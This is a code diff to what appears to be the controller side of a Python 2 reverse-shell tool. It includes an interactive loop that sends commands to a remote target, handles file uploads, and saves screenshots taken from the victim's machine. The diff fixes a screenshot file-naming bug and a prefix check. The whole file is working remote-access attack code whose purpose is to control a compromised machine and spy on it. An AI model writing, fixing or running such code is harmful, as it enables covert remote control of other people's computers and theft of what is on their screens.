@@ -3,10 +3,6 @@ import socket
 import json
 import base64
 
-count = 1
-
-from Reverse_shell import screenshot
-
 def reliable_send(data):
     json_data = json.dumps(data)
     target.send(json_data)
@@ -21,6 +17,8 @@ def reliable_receive():
             continue
 
 def shell():
+    global count
+    count = 1
     while True:
         command = raw_input("* Shell#-%s: " % str(ip))
         reliable_send(command)
@@ -40,10 +38,10 @@ def shell():
                 faild = "failed to upload file"  
                 reliable_send(base64.b64encode(faild)) 
         elif command[:10] == "screenshot":
-                with open("screenshot%d", 'wb') as screen:
+                with open("screenshot%d" % count, 'wb') as screen:
                     image = reliable_receive()
                     image_decode = base64.b64decode(image)
-                    if image_decode[:4] == "[-]":
+                    if image_decode[:3] == "[-]":
                         print(image_decode)
                     else:
                         screen.write(image_decode)
